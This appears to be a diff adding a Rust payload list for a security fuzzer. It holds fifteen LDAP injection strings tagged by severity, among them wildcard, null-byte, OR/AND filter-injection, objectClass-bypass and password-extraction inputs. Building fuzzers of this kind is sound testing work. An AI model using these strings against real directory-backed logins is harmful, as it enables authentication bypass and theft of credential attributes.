@@ -1,0 +1,111 @@
+use crate::fuzzer::payloads::{Payload, PayloadType, Severity};
+
+pub fn get_payloads() -> Vec<Payload> {
+    vec![
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "*".to_string(),
+            description: "LDAP wildcard injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "injection".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "admin)\x00".to_string(),
+            description: "LDAP null byte injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "null-byte".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "admin)(uid=*))(|(uid=*".to_string(),
+            description: "LDAP OR injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "or-injection".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "*(objectClass=*)".to_string(),
+            description: "LDAP objectClass bypass".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "bypass".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "admin)(objectClass=*".to_string(),
+            description: "LDAP objectClass injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "injection".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: ")(cn=*))(|(cn=*".to_string(),
+            description: "LDAP filter injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "filter".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "*()".to_string(),
+            description: "LDAP empty filter test".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["ldap".to_string(), "test".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "admin\x00".to_string(),
+            description: "LDAP null character bypass".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "bypass".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "admin\\28".to_string(),
+            description: "LDAP escaped parenthesis".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["ldap".to_string(), "encoding".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "admin)(&(password=*)".to_string(),
+            description: "LDAP AND injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "and-injection".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "))(objectClass=*".to_string(),
+            description: "LDAP double parenthesis bypass".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "bypass".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "admin".to_string(),
+            description: "LDAP basic username test".to_string(),
+            severity: Severity::Low,
+            tags: vec!["ldap".to_string(), "basic".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "*)(objectClass=*".to_string(),
+            description: "LDAP asterisk injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "injection".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "admin)(|(userPassword=*)".to_string(),
+            description: "LDAP password extraction attempt".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["ldap".to_string(), "password".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: ")(cn=*".to_string(),
+            description: "LDAP cn field injection".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["ldap".to_string(), "injection".to_string()],
+        },
+    ]
+}
